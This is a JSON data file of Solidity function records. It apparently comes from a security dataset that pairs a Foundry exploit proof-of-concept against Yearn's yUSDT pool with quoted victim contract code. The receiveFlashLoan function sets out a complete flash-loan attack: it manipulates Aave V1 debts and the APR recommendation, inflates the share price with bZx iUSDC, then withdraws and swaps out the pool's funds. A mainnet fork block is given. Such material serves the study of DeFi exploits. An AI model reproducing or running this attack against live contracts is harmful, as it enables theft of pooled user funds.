[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "aaveV1UsdtDebtUsers",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        curveYSwap.exchange_underlying(0, 2, FLASHLOAN_DAI_AMOUNT, 1);\n        curveYSwap.exchange_underlying(1, 2, 3_000_000 * 1e6, 1);\n\n        uint256 aapr;\n        (,,, aapr,) = iEarnAprWithPool.recommend(address(usdt));\n        emit log_named_uint(\"[INFO]  Before helping aaveV1 users repay their USDT debts, APR value\", aapr);\n\n        repay();\n\n        (,,, aapr,) = iEarnAprWithPool.recommend(address(usdt));\n        emit log_named_uint(\"[INFO]  After helping aaveV1 users repay their USDT debts, APR value\", aapr);\n\n        yUSDT.deposit(YUSDT_DEPOSIT_USDT_AMOUNT);\n\n        uint256 amount = yUSDT.balanceAave() * bZxiUSDC.tokenPrice() / 1e18 * 114 / 100;\n        uint256 mintAmount = bZxiUSDC.mint(address(this), amount);\n\n        bZxiUSDC.transfer(address(yUSDT), mintAmount); //Raise the price per share\n\n        uint256 sharePrice = yUSDT.getPricePerFullShare();\n        emit log_named_decimal_uint(\"[INFO]  Transfer bZxUSDC, increase the price per share to\", sharePrice, 18);\n\n        uint256 withdrawAmount = ((yUSDT.balanceAave() + yUSDT.balance()) * 1e18) / (sharePrice) + 1;\n        yUSDT.withdraw(withdrawAmount);\n\n        yUSDT.rebalance();\n        usdt.transfer(address(yUSDT), 1);\n        yUSDT.deposit(10_000_000_000);\n\n        curveYSwap.exchange(2, 0, 70_000_000_000, 1);\n        curveYSwap.exchange(2, 1, 400_000_000_000_000, 1);\n        curveYSwap.exchange(2, 3, yUSDT.balanceOf(address(this)) * 100 / 101, 1);\n        yDAI.withdraw(yDAI.balanceOf(address(this)));\n        yUSDC.withdraw(yUSDC.balanceOf(address(this)));\n\n        usdt.transfer(address(balancer), FLASHLOAN_USDT_AMOUNT);\n        usdc.transfer(address(balancer), FLASHLOAN_USDC_AMOUNT);\n        dai.transfer(address(balancer), FLASHLOAN_DAI_AMOUNT);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"mainnet\", 17_036_774);\n    }\n\n    //tx:0x055cec4fa4614836e54ea2e5cd3d14247ff3d61b85aa2a41f8cc876d131e0328\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        init();\n        run();\n        emit log_named_decimal_uint(\"[End]   Attacker USDC balance after exploit\", usdc.balanceOf(address(this)), 6);\n        emit log_named_decimal_uint(\"[End]   Attacker DAI balance after exploit\", dai.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[End]   Attacker YTUSD balance after exploit\", yTUSD.balanceOf(address(this)), 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IIEarnAPRWithPool",
    "source_type": "victim_contract",
    "function_name": "recommend",
    "original_code": "    function recommend(address _token) public view returns (\n      string memory choice,\n      uint256 capr,\n      uint256 iapr,\n      uint256 aapr,\n      uint256 dapr\n    ) {\n      ( , capr, , iapr, , aapr, , dapr, , ) = getAPROptionsInc(_token);\n      return (choice, capr, iapr, aapr, dapr);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "balance",
    "original_code": "  function balance() public view returns (uint256) {\n    return IERC20(token).balanceOf(address(this));\n  }\n\n  function balanceDydx() public view returns (uint256) {\n      Wei memory bal = DyDx(dydx).getAccountWei(Info(address(this), 0), dToken);\n      return bal.value;\n  }\n  function balanceCompound() public view returns (uint256) {\n      return IERC20(compound).balanceOf(address(this));\n  }\n  function balanceCompoundInToken() public view returns (uint256) {\n    // Mantisa 1e18 to decimals\n    uint256 b = balanceCompound();\n    if (b > 0) {\n      b = b.mul(Compound(compound).exchangeRateStored()).div(1e18);\n    }\n    return b;\n  }\n  function balanceFulcrumInToken() public view returns (uint256) {\n    uint256 b = balanceFulcrum();\n    if (b > 0) {\n      b = Fulcrum(fulcrum).assetBalanceOf(address(this));\n    }\n    return b;\n  }\n  function balanceFulcrum() public view returns (uint256) {\n    return IERC20(fulcrum).balanceOf(address(this));\n  }\n  function balanceAave() public view returns (uint256) {\n    return IERC20(aaveToken).balanceOf(address(this));\n  }\n\n  function _balance() internal view returns (uint256) {\n    return IERC20(token).balanceOf(address(this));\n  }\n\n  function _balanceDydx() internal view returns (uint256) {\n      Wei memory bal = DyDx(dydx).getAccountWei(Info(address(this), 0), dToken);\n      return bal.value;\n  }\n  function _balanceCompound() internal view returns (uint256) {\n      return IERC20(compound).balanceOf(address(this));\n  }\n  function _balanceCompoundInToken() internal view returns (uint256) {\n    // Mantisa 1e18 to decimals\n    uint256 b = balanceCompound();\n    if (b > 0) {\n      b = b.mul(Compound(compound).exchangeRateStored()).div(1e18);\n    }\n    return b;\n  }\n  function _balanceFulcrumInToken() internal view returns (uint256) {\n    uint256 b = balanceFulcrum();\n    if (b > 0) {\n      b = Fulcrum(fulcrum).assetBalanceOf(address(this));\n    }\n    return b;\n  }\n  function _balanceFulcrum() internal view returns (uint256) {\n    return IERC20(fulcrum).balanceOf(address(this));\n  }\n  function _balanceAave() internal view returns (uint256) {\n    return IERC20(aaveToken).balanceOf(address(this));\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "balanceAave",
    "original_code": "  function balanceAave() public view returns (uint256) {\n    return IERC20(aaveToken).balanceOf(address(this));\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\ncontract ReentrancyGuard {\n    uint256 private _guardCounter;\n\n    constructor () internal {\n        _guardCounter = 1;\n    }\n\n    modifier nonReentrant() {\n        _guardCounter += 1;\n        uint256 localCounter = _guardCounter;\n        _;\n        require(localCounter == _guardCounter, \"ReentrancyGuard: reentrant call\");\n    }\n}\n\nlibrary SafeMath {\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "  function deposit(uint256 _amount)\n      external\n      nonReentrant\n  {\n      require(_amount > 0, \"deposit must be greater than 0\");\n      pool = _calcPoolValueInToken();\n\n      IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);\n\n      // Calculate pool shares\n      uint256 shares = 0;\n      if (pool == 0) {\n        shares = _amount;\n        pool = _amount;\n      } else {\n        shares = (_amount.mul(_totalSupply)).div(pool);\n      }\n      pool = _calcPoolValueInToken();\n      _mint(msg.sender, shares);\n  }\n\n  // No rebalance implementation for lower fees and faster swaps\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "getPricePerFullShare",
    "original_code": "  function getPricePerFullShare() public view returns (uint) {\n    uint _pool = calcPoolValueInToken();\n    return _pool.mul(1e18).div(_totalSupply);\n  }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "rebalance",
    "original_code": "  function rebalance() public {\n    Lender newProvider = recommend();\n\n    if (newProvider != provider) {\n      _withdrawAll();\n    }\n\n    if (balance() > 0) {\n      if (newProvider == Lender.DYDX) {\n        supplyDydx(balance());\n      } else if (newProvider == Lender.FULCRUM) {\n        supplyFulcrum(balance());\n      } else if (newProvider == Lender.COMPOUND) {\n        supplyCompound(balance());\n      } else if (newProvider == Lender.AAVE) {\n        supplyAave(balance());\n      }\n    }\n\n    provider = newProvider;\n  }\n\n  // Internal only rebalance for better gas in redeem\n  function _rebalance(Lender newProvider) internal {\n    if (_balance() > 0) {\n      if (newProvider == Lender.DYDX) {\n        supplyDydx(_balance());\n      } else if (newProvider == Lender.FULCRUM) {\n        supplyFulcrum(_balance());\n      } else if (newProvider == Lender.COMPOUND) {\n        supplyCompound(_balance());\n      } else if (newProvider == Lender.AAVE) {\n        supplyAave(_balance());\n      }\n    }\n    provider = newProvider;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IyToken",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "  function withdraw(uint256 _shares)\n      external\n      nonReentrant\n  {\n      require(_shares > 0, \"withdraw must be greater than 0\");\n\n      uint256 ibalance = balanceOf(msg.sender);\n      require(_shares <= ibalance, \"insufficient balance\");\n\n      // Could have over value from cTokens\n      pool = _calcPoolValueInToken();\n      // Calc to redeem before updating balances\n      uint256 r = (pool.mul(_shares)).div(_totalSupply);\n\n\n      _balances[msg.sender] = _balances[msg.sender].sub(_shares, \"redeem amount exceeds balance\");\n      _totalSupply = _totalSupply.sub(_shares);\n\n      emit Transfer(msg.sender, address(0), _shares);\n\n      // Check balance\n      uint256 b = IERC20(token).balanceOf(address(this));\n      if (b < r) {\n        _withdrawSome(r.sub(b));\n      }\n\n      IERC20(token).safeTransfer(msg.sender, r);\n      pool = _calcPoolValueInToken();\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAaveLendingPoolCoreV1",
    "source_type": "victim_contract",
    "function_name": "getUserBorrowBalances",
    "original_code": "    function getUserBorrowBalances(address _reserve, address _user)\n        public\n        view\n        returns (uint256, uint256, uint256)\n    {\n        CoreLibrary.UserReserveData storage user = usersReserveData[_user][_reserve];\n        if (user.principalBorrowBalance == 0) {\n            return (0, 0, 0);\n        }\n\n        uint256 principal = user.principalBorrowBalance;\n        uint256 compoundedBalance = CoreLibrary.getCompoundedBorrowBalance(\n            user,\n            reserves[_reserve]\n        );\n        return (principal, compoundedBalance, compoundedBalance.sub(principal));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbZxiUSDC",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address usr, uint wad) external auth {\n        balanceOf[usr] = add(balanceOf[usr], wad);\n        totalSupply    = add(totalSupply, wad);\n        emit Transfer(address(0), usr, wad);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IbZxiUSDC",
    "source_type": "victim_contract",
    "function_name": "tokenPrice",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IbZxiUSDC",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n",
    "description": ""
  }
]